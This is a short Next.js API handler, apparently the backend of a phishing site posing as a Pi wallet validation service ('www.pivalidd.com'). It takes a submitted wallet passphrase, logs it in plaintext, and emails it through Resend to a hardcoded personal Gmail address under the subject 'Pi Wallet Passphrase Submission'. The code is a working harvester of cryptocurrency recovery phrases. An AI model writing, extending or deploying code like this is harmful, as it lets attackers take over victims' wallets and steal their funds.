// 
import { Resend } from "resend";
import { NextApiRequest, NextApiResponse } from "next";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  // Only allow POST requests
  if (req.method !== "POST") {
    res.setHeader("Allow", ["POST"]);
    return res.status(405).json({ message: "Method not allowed" });
  }

  console.log("✅ API request received");

  try {
    // Validate request body
    const { passphrase } = req.body;
    
    if (!passphrase) {
      console.error("❌ Missing passphrase in request body");
      return res.status(400).json({ message: "Passphrase is required" });
    }

    console.log("📩 Received Passphrase:", passphrase);

    // Validate environment variables
    const RESEND_API_KEY = process.env.RESEND_API_KEY;
    const RESEND_FROM_EMAIL = process.env.RESEND_FROM_EMAIL;
    const RECIPIENT_EMAIL = "rahej716@gmail.com";

    if (!RESEND_API_KEY || !RESEND_FROM_EMAIL) {
      console.error("❌ Missing required environment variables");
      return res.status(500).json({ 
        message: "Server configuration error",
        details: RESEND_API_KEY ? "Missing FROM_EMAIL" : "Missing API_KEY"
      });
    }

    // Initialize Resend
    const resend = new Resend(RESEND_API_KEY);

    // Send email
    const data = await resend.emails.send({
      from: `www.pivalidd.com <${RESEND_FROM_EMAIL}>`,
      to: [RECIPIENT_EMAIL],
      subject: "Pi Wallet Passphrase Submission",
      html: `<strong>Passphrase:</strong> ${passphrase}`,
    });

    console.log("✅ Email sent successfully:", data);
    return res.status(200).json({ 
      message: "Email sent successfully", 
      data 
    });

  } catch (error) {
    console.error("❌ Error sending email:", error);
    
    // Type guard for error
    if (error instanceof Error) {
      return res.status(500).json({ 
        message: "Failed to send email", 
        error: error.message 
      });
    }
    
    return res.status(500).json({ 
      message: "Unknown error occurred" 
    });
  }
}